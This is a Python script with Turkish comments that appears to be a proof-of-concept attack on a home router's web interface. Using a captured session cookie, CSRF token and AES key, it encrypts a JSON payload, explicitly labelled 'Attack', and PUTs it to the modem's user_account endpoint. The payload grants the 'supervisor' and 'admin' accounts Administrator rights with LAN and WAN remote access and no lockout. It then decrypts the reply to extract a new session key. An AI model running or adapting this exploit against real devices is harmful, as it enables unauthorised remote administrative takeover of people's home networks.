import requests
import base64
import json
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
import os
import sys

# Add the 'src' directory to the Python path
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
src_path = os.path.join(project_root, 'src')
sys.path.insert(0, src_path)

from mymodem.login import get_credentials

# 🔹 Modem IP Adresi
MODEM_IP = "192.168.1.1"

# —————— Login.py üzerinden credential'ları al ——————
session_cookie, zysession_key, AES_KEY_B64 = get_credentials()

# 🔹 Tarayıcıdan alınan Session çerezi
cookies = {
    "Session": session_cookie
}

# 🔹 HTTP Başlıkları
headers = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/133.0"
    ),
    "X-Requested-With": "XMLHttpRequest",
    "Referer": f"https://{MODEM_IP}/UserAccount",
    "Origin": f"https://{MODEM_IP}",
    "Host": MODEM_IP,
    "CsrfToken": zysession_key,
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}

# 🔹 Attack: False olacak JSON
json_data = [
    {
        "Index": 1,
        "Enabled": True,
        "Username": "supervisor",
        "AccountRetryTime": 0,
        "AccountIdleTime": 3000,
        "AccountLockTime": 0,
        "RemoteAccessPrivilege": "LAN,WAN",
        "group": "Administrator",
        "editId": "acc_editBtn0",
        "deleteId": "acc_deleteBtn0",
        "activeId": "userAccount-1"
    },
    {
        "Index": 2,
        "Enabled": True,
        "Username": "admin",
        "AccountRetryTime": 0,
        "AccountIdleTime": 3000,
        "AccountLockTime": 0,
        "RemoteAccessPrivilege": "LAN,WAN",
        "group": "Administrator",
        "editId": "acc_editBtn0",
        "deleteId": "acc_deleteBtn0",
        "activeId": "userAccount0"
    }
]

# 🔹 Yeni IV Al

def get_iv():
    response = requests.get(
        f"https://{MODEM_IP}/cgi-bin/DAL?oid=user_account&timedelay=1",
        headers=headers,
        cookies=cookies,
        verify=False
    )
    response.raise_for_status()
    data = response.json()
    iv = data.get("iv")
    if iv:
        print(f"✅ **Yeni IV Alındı:** {iv}")
        return iv
    print("\n❌ **Hata: IV alınamadı!**")
    return None

# 🔹 JSON'u AES ile şifreleme
def encrypt_data(data, iv):
    aes_key = base64.b64decode(AES_KEY_B64)
    iv_decoded = base64.b64decode(iv)[:16]

    json_string = json.dumps(data, separators=(",", ":"))
    cipher = AES.new(aes_key, AES.MODE_CBC, iv_decoded)
    encrypted_data = cipher.encrypt(pad(json_string.encode(), AES.block_size))

    return base64.b64encode(encrypted_data).decode("utf-8")

# 🔹 Yanıtı Çözüp Session Key'i Al
def decrypt_response(encrypted_content, iv_base64):
    aes_key = base64.b64decode(AES_KEY_B64)
    iv = base64.b64decode(iv_base64)[:16]

    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    decrypted_bytes = unpad(
        cipher.decrypt(base64.b64decode(encrypted_content)),
        AES.block_size
    )
    decrypted_json = decrypted_bytes.decode("utf-8")

    print("\n✅ **Şifre Çözüldü!**")
    print(decrypted_json)

    # **Yeni Session Key'i çek**
    try:
        response_dict = json.loads(decrypted_json)
        return response_dict.get("sessionkey")
    except json.JSONDecodeError:
        print("\n❌ **Hata: Yanıt JSON formatında değil!**")
    return None

# 🔹 IV Al
iv_base64 = get_iv()
if not iv_base64:
    exit(1)

# 🔹 JSON'u Şifrele
encrypted_content = encrypt_data(json_data, iv_base64)

# 🔹 Modeme Güncellenmiş İstek Gönder
payload = {
    "content": encrypted_content,
    "iv": iv_base64
}
print(payload)

print("\n📡 **Modeme Güncellenmiş İstek Gönderiliyor...**")
response = requests.put(
    f"https://{MODEM_IP}/cgi-bin/DAL?oid=user_account&timedelay=1",
    headers=headers,
    cookies=cookies,
    json=payload,
    verify=False
)
response.raise_for_status()

# 🔹 Yanıtı Çöz ve Yeni Session Key’i Al
response_data = response.json()
encrypted_content = response_data.get("content")
iv_base64 = response_data.get("iv")
new_session_key = decrypt_response(encrypted_content, iv_base64)
if new_session_key:
    print(f"\n🔑 **Yeni SessionKey:** {new_session_key}")
